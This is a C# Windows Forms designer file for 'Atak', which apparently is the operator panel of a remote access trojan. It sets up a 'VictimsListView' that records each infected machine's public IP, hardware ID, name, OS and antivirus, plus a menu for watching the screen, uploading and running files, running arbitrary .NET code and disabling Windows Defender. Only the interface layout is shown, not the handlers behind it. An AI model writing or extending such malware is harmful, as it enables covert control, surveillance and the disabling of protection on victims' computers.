namespace Atak
{
    partial class MainForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.VictimsListView = new System.Windows.Forms.ListView();
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuList = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.sendMessageBoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.watchScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uploadFileAndRunToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sendCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.closeServerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.visitSiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disableDefenderAdminToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.getProcessesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuList.SuspendLayout();
            this.SuspendLayout();
            // 
            // VictimsListView
            // 
            this.VictimsListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader3,
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader4,
            this.columnHeader5});
            this.VictimsListView.ContextMenuStrip = this.contextMenuList;
            this.VictimsListView.HideSelection = false;
            this.VictimsListView.Location = new System.Drawing.Point(12, 12);
            this.VictimsListView.Name = "VictimsListView";
            this.VictimsListView.Size = new System.Drawing.Size(1077, 397);
            this.VictimsListView.TabIndex = 0;
            this.VictimsListView.UseCompatibleStateImageBehavior = false;
            this.VictimsListView.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "Public IP";
            this.columnHeader3.Width = 121;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Hardware ID";
            this.columnHeader1.Width = 127;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Machine Name";
            this.columnHeader2.Width = 141;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "OS";
            this.columnHeader4.Width = 152;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "Anti";
            this.columnHeader5.Width = 151;
            // 
            // contextMenuList
            // 
            this.contextMenuList.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.contextMenuList.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sendMessageBoxToolStripMenuItem,
            this.watchScreenToolStripMenuItem,
            this.uploadFileAndRunToolStripMenuItem,
            this.sendCodeToolStripMenuItem,
            this.closeServerToolStripMenuItem,
            this.visitSiteToolStripMenuItem,
            this.disableDefenderAdminToolStripMenuItem,
            this.getProcessesToolStripMenuItem});
            this.contextMenuList.Name = "contextMenuList";
            this.contextMenuList.Size = new System.Drawing.Size(253, 224);
            // 
            // sendMessageBoxToolStripMenuItem
            // 
            this.sendMessageBoxToolStripMenuItem.Name = "sendMessageBoxToolStripMenuItem";
            this.sendMessageBoxToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.sendMessageBoxToolStripMenuItem.Text = "Send MessageBox";
            this.sendMessageBoxToolStripMenuItem.Click += new System.EventHandler(this.sendMessageBoxToolStripMenuItem_Click);
            // 
            // watchScreenToolStripMenuItem
            // 
            this.watchScreenToolStripMenuItem.Name = "watchScreenToolStripMenuItem";
            this.watchScreenToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.watchScreenToolStripMenuItem.Text = "Watch Screen";
            this.watchScreenToolStripMenuItem.Click += new System.EventHandler(this.watchScreenToolStripMenuItem_Click);
            // 
            // uploadFileAndRunToolStripMenuItem
            // 
            this.uploadFileAndRunToolStripMenuItem.Name = "uploadFileAndRunToolStripMenuItem";
            this.uploadFileAndRunToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.uploadFileAndRunToolStripMenuItem.Text = "Upload File and Run";
            this.uploadFileAndRunToolStripMenuItem.Click += new System.EventHandler(this.uploadFileAndRunToolStripMenuItem_Click);
            // 
            // sendCodeToolStripMenuItem
            // 
            this.sendCodeToolStripMenuItem.Name = "sendCodeToolStripMenuItem";
            this.sendCodeToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.sendCodeToolStripMenuItem.Text = "Run .NET code ";
            this.sendCodeToolStripMenuItem.Click += new System.EventHandler(this.sendCodeToolStripMenuItem_Click);
            // 
            // closeServerToolStripMenuItem
            // 
            this.closeServerToolStripMenuItem.Name = "closeServerToolStripMenuItem";
            this.closeServerToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.closeServerToolStripMenuItem.Text = "Close Server";
            this.closeServerToolStripMenuItem.Click += new System.EventHandler(this.closeServerToolStripMenuItem_Click);
            // 
            // visitSiteToolStripMenuItem
            // 
            this.visitSiteToolStripMenuItem.Name = "visitSiteToolStripMenuItem";
            this.visitSiteToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.visitSiteToolStripMenuItem.Text = "Visit Site";
            this.visitSiteToolStripMenuItem.Click += new System.EventHandler(this.visitSiteToolStripMenuItem_Click);
            // 
            // disableDefenderAdminToolStripMenuItem
            // 
            this.disableDefenderAdminToolStripMenuItem.Name = "disableDefenderAdminToolStripMenuItem";
            this.disableDefenderAdminToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.disableDefenderAdminToolStripMenuItem.Text = "Disable Defender (Admin)";
            this.disableDefenderAdminToolStripMenuItem.Click += new System.EventHandler(this.disableDefenderAdminToolStripMenuItem_Click);
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 1000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // getProcessesToolStripMenuItem
            // 
            this.getProcessesToolStripMenuItem.Name = "getProcessesToolStripMenuItem";
            this.getProcessesToolStripMenuItem.Size = new System.Drawing.Size(252, 24);
            this.getProcessesToolStripMenuItem.Text = "Get Processes";
            this.getProcessesToolStripMenuItem.Click += new System.EventHandler(this.getProcessesToolStripMenuItem_Click);
            // 
            // MainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1113, 428);
            this.Controls.Add(this.VictimsListView);
            this.Name = "MainForm";
            this.Text = "Atak";
            this.Load += new System.EventHandler(this.MainForm_Load);
            this.contextMenuList.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.ListView VictimsListView;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ContextMenuStrip contextMenuList;
        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.ToolStripMenuItem sendMessageBoxToolStripMenuItem;
        private System.Windows.Forms.ColumnHeader columnHeader3;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        private System.Windows.Forms.ToolStripMenuItem watchScreenToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem closeServerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uploadFileAndRunToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sendCodeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem visitSiteToolStripMenuItem;
        private System.Windows.Forms.ColumnHeader columnHeader5;
        private System.Windows.Forms.ToolStripMenuItem disableDefenderAdminToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem getProcessesToolStripMenuItem;
    }
}

